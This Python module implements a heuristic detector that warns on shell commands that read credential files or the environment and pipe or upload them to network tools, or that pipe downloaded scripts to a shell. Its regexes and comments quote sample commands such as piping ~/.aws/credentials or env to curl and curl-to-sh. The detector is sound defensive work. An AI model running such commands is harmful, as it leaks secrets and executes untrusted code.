"""Local-only detector for outbound shell exfiltration shapes.

Adapter 2 (the Claude Code hook) sees Bash command strings before they run,
which the Inference hooks server never does at the same fidelity. This
detector looks for the shape "read something sensitive -> pipe it off the
box". It is heuristic and ships at `warn` severity by default: it is a signal
for the operator, not a gate on the developer.
"""

from __future__ import annotations

import re
from bisect import bisect_left
from collections.abc import Callable, Iterable, Iterator
from typing import NamedTuple

from ..models import Finding, ScanUnit, digest
from .base import TIER_T0

_NET_SINK = r"(?:curl|wget|nc|ncat|netcat|socat|httpie|http)\b"
_SENSITIVE_SOURCE = (
    r"(?:~/\.ssh/|/\.aws/|\.env\b|id_rsa|id_ed25519|credentials\b|"
    r"\.netrc|\.npmrc|\.pypirc|kubeconfig|/etc/shadow)"
)
# A flag starts a token: it follows the start of the text, whitespace or a
# quote. The short flags are case-sensitive.
# A token `field@path` naming a sensitive source is httpie's file field and
# curl's `-F field=@path` value.
_UPLOAD_FLAG = (
    r"(?<![^\s'\"])(?:(?-i:-[dFT])"
    r"|--data(?:-binary|-raw|-urlencode|-ascii)?|--json|--form|--upload-file"
    r"|--post-(?:file|data)|--body-(?:file|data)"
    rf"|[\w.-]+=?@(?=[^\s'\"]*{_SENSITIVE_SOURCE}))"
)
# Longer than any sink, source or flag plus the character a trailing `\b`
# looks at, so a search that stops this far past a position still sees every
# match starting before it.
_MARGIN = 32

# Every position where a sink, source or flag starts, overlapping ones
# included, with the match in group 1.
_SINK_AT = re.compile(rf"(?i)(?=({_NET_SINK}))")
_SOURCE_AT = re.compile(rf"(?i)(?=({_SENSITIVE_SOURCE}))")
_FLAG_AT = re.compile(rf"(?i)(?=({_UPLOAD_FLAG}))")


class ShellRule(NamedTuple):
    id: str
    description: str
    # The rule's spans, in linear time: exactly those of its reference
    # pattern in `tests/shell_reference.py`.
    find: Callable[[str], Iterator[tuple[int, int]]]


def _finditer_spans(pattern: re.Pattern[str]) -> Callable[[str], Iterator[tuple[int, int]]]:
    def find(text: str) -> Iterator[tuple[int, int]]:
        for match in pattern.finditer(text):
            yield match.span()

    return find


def _earliest_start(starts: re.Pattern[str], text: str, lo: int, latest: int) -> int:
    """The first position in [lo, latest] where `starts` matches; `latest`
    qualifies."""
    m = starts.search(text, lo, latest + _MARGIN)
    return m.start() if m is not None and m.start() < latest else latest


def _segment_start(text: str, pos: int, end: int, boundaries: str) -> int:
    return max(pos, *(text.rfind(c, pos, end) + 1 for c in boundaries))


def _blocked_then_widened(
    scan: re.Pattern[str], starts: re.Pattern[str], boundaries: str
) -> Callable[[str], Iterator[tuple[int, int]]]:
    """Spans of `<start>[^boundaries]*[|]<tail>` from `scan`, the same
    pattern with no `<start>` allowed inside the gap.

    Every start between one boundary and the `|` reaches the same tail, so
    the blocked pattern finds each match from the last start before the `|`,
    without rescanning the gap from every earlier one. The reported span
    begins at the earliest start the unblocked pattern would have taken.
    """

    def find(text: str) -> Iterator[tuple[int, int]]:
        pos = 0
        for m in scan.finditer(text):
            lo = _segment_start(text, pos, m.start(), boundaries)
            yield _earliest_start(starts, text, lo, m.start()), m.end()
            pos = m.end()

    return find


def _net_upload_spans(text: str) -> Iterator[tuple[int, int]]:
    """Spans of the net-upload-sensitive pattern.

    A match runs from the first sink on a line that has an upload flag after
    it and a source after that flag, to the last source on the line, so a
    line holds at most one match. A later sink on the same line reaches only
    flags the first one reaches too.
    """
    sources = [(m.start(), m.end(1)) for m in _SOURCE_AT.finditer(text)]
    if not sources:
        return
    flags = [(m.start(), m.end(1)) for m in _FLAG_AT.finditer(text)]
    if not flags:
        return
    source_starts = [s for s, _ in sources]
    flag_starts = [q for q, _ in flags]
    pos = 0
    while (m := _SINK_AT.search(text, pos)) is not None:
        p, e = m.start(), m.end(1)
        line_end = text.find("\n", e)
        if line_end < 0:
            line_end = len(text)
        pos = line_end + 1
        i = bisect_left(flag_starts, e)
        j = bisect_left(source_starts, line_end) - 1
        if i == len(flags) or j < 0:
            continue
        q, f = flags[i]
        if q < line_end and source_starts[j] >= f:
            yield p, sources[j][1]


_PIPE_TO_NET_SCAN = re.compile(
    rf"(?i){_SENSITIVE_SOURCE}(?:(?!{_SENSITIVE_SOURCE})[^|;&\n])*+([|])\s*+{_NET_SINK}"
)
_REMOTE_EXEC_SCAN = re.compile(
    rf"(?i){_NET_SINK}(?:(?!{_NET_SINK})[^\n|])*+([|])\s*+(?:sudo\s++)?(?:ba|z|d)?sh\b"
)
_ENV_TO_NET = re.compile(rf"(?i)\b(?:env|printenv|set)\b\s*+[|]\s*+{_NET_SINK}")

RULES: tuple[ShellRule, ...] = (
    ShellRule(
        "pipe-to-net",
        # `cat ~/.aws/credentials | curl ...` and friends.
        "a shell command that pipes credential files to a network tool",
        _blocked_then_widened(_PIPE_TO_NET_SCAN, _SOURCE_AT, "|;&\n"),
    ),
    ShellRule(
        "net-upload-sensitive",
        # `curl -d @~/.ssh/id_rsa https://...`
        "a shell command that uploads a credential file",
        _net_upload_spans,
    ),
    ShellRule(
        "env-to-net",
        # `env | curl ...`, `printenv | nc ...`
        "a shell command that pipes the environment to a network tool",
        _finditer_spans(_ENV_TO_NET),
    ),
    ShellRule(
        "remote-exec",
        # `curl https://x | sh` -- not exfil, but the same trust boundary.
        "a shell command that executes a downloaded script",
        _blocked_then_widened(_REMOTE_EXEC_SCAN, _SINK_AT, "\n|"),
    ),
)

DESCRIPTIONS = {f"shell:{rule.id}": rule.description for rule in RULES}


class ShellExfilDetector:
    name = "shell"
    tier = TIER_T0

    def __init__(self, severity: str = "warn", salt: str = ""):
        self.severity = severity
        self._salt = salt

    def available(self) -> bool:
        return True

    def scan(self, units: Iterable[ScanUnit]) -> list[Finding]:
        findings: list[Finding] = []
        for unit in units:
            if not unit.text:
                continue
            # A backslash-newline continues a command. Two spaces for the two
            # characters keep every offset where it was in `unit.text`.
            text = unit.text.replace("\\\n", "  ")
            for rule in RULES:
                for start, end in rule.find(text):
                    findings.append(
                        Finding(
                            detector=f"shell:{rule.id}",
                            severity=self.severity,
                            locator=unit.locator,
                            excerpt_hash=digest(unit.text[start:end], self._salt),
                            tool_name=unit.tool_name,
                        )
                    )
        return findings
